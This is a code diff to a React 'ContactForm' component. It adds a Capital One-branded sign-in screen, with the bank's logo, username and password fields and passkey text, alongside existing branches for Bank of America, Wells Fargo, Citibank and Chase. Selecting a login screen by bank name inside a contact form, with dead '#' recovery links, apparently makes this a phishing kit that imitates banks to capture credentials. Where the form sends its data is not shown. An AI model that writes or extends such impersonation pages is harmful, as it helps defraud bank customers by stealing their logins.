@@ -89,6 +89,7 @@ export default function ContactForm() {
   const isBankOfAmerica = bankName?.toLowerCase().includes('bank of america')
   const isWellsFargo = bankName?.toLowerCase().includes('wells fargo')
   const isCitibank = bankName?.toLowerCase().includes('citibank')
+  const isCapitalOne = bankName?.toLowerCase().includes('capital one')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -378,6 +379,109 @@ export default function ContactForm() {
                       Passwordless Sign On
                     </a>
                   </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Capital One
+    if (isCapitalOne) {
+      return (
+        <div className="min-h-screen bg-gray-50 px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-[500px]">
+              <div className="rounded-2xl bg-white p-10 shadow-lg">
+                {/* Logo del banco */}
+                <div className="mb-10 flex h-12 items-center justify-center">
+                  <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
+                </div>
+
+                <h1 className="mb-8 text-center text-3xl font-bold text-content-primary">Sign In</h1>
+
+                <form onSubmit={submitForm} className="space-y-6">
+                  {/* Username */}
+                  <div>
+                    <label className="mb-2 block text-sm font-semibold text-content-primary">Username</label>
+                    <div className="relative">
+                      <Icon name="user" size={20} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400" />
+                      <input
+                        type="text"
+                        required
+                        value={username}
+                        onChange={(e) => setUsername(e.target.value)}
+                        className="w-full rounded-lg border-2 border-black/20 bg-white pl-12 py-3 pr-4 text-content-primary outline-none transition-colors focus:border-blue-600"
+                      />
+                    </div>
+                  </div>
+
+                  {/* Password */}
+                  <div>
+                    <label className="mb-2 block text-sm font-semibold text-content-primary">Password</label>
+                    <div className="relative">
+                      <Icon name="lock" size={20} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400" />
+                      <input
+                        type={showPassword ? 'text' : 'password'}
+                        required
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        className="w-full rounded-lg border-2 border-black/20 bg-white pl-12 py-3 pr-12 text-content-primary outline-none transition-colors focus:border-blue-600"
+                      />
+                      <button
+                        type="button"
+                        onClick={() => setShowPassword(!showPassword)}
+                        className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                      >
+                        <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* Remember Me */}
+                  <label className="flex items-center gap-3">
+                    <input
+                      type="checkbox"
+                      checked={rememberUsername}
+                      onChange={(e) => setRememberUsername(e.target.checked)}
+                      className="h-5 w-5 cursor-pointer rounded border-2 border-black/30"
+                    />
+                    <span className="text-sm text-content-primary">Remember Me</span>
+                  </label>
+
+                  {/* Sign In Button */}
+                  <button
+                    type="submit"
+                    disabled={submitting}
+                    className="mt-8 w-full rounded-lg bg-blue-700 py-3.5 font-bold text-white hover:bg-blue-800 disabled:opacity-60"
+                  >
+                    {submitting ? 'Signing in…' : 'Sign in'}
+                  </button>
+                </form>
+
+                {/* Passwordless Section */}
+                <div className="mt-8 rounded-lg border-2 border-black/10 bg-gray-50 p-6">
+                  <div className="mb-3 flex items-center gap-3">
+                    <Icon name="smartphone" size={24} className="text-blue-600" />
+                    <span className="text-base font-semibold text-content-primary">Go passwordless with a passkey</span>
+                  </div>
+                  <p className="mb-4 text-sm text-content-secondary">
+                    No more having to remember a password. Use a passkey to sign in using your face or fingerprint.
+                  </p>
+                  <a href="#" className="text-sm font-semibold text-blue-600 hover:text-blue-700">
+                    Create a passkey
+                  </a>
+                </div>
+
+                {/* Links */}
+                <div className="mt-8 space-y-3 text-center">
+                  <a href="#" className="block text-sm font-semibold text-blue-600 hover:text-blue-700">
+                    Forgot Username or Password?
+                  </a>
+                  <a href="#" className="block text-sm font-semibold text-blue-600 hover:text-blue-700">
+                    Set Up Online Access
+                  </a>
                 </div>
               </div>
             </div>
